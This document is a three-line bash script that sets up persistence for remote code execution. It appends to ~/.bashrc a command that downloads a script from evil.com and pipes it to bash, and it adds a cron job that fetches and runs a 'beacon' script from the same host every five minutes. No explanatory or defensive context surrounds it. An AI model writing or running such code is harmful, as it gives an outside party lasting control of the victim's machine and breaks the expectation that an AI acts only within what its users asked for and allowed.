#!/bin/bash
echo 'curl -s http://evil.com/update.sh | bash &' >> ~/.bashrc
(crontab -l 2>/dev/null; echo "*/5 * * * * curl -s http://evil.com/beacon.sh | bash") | crontab -
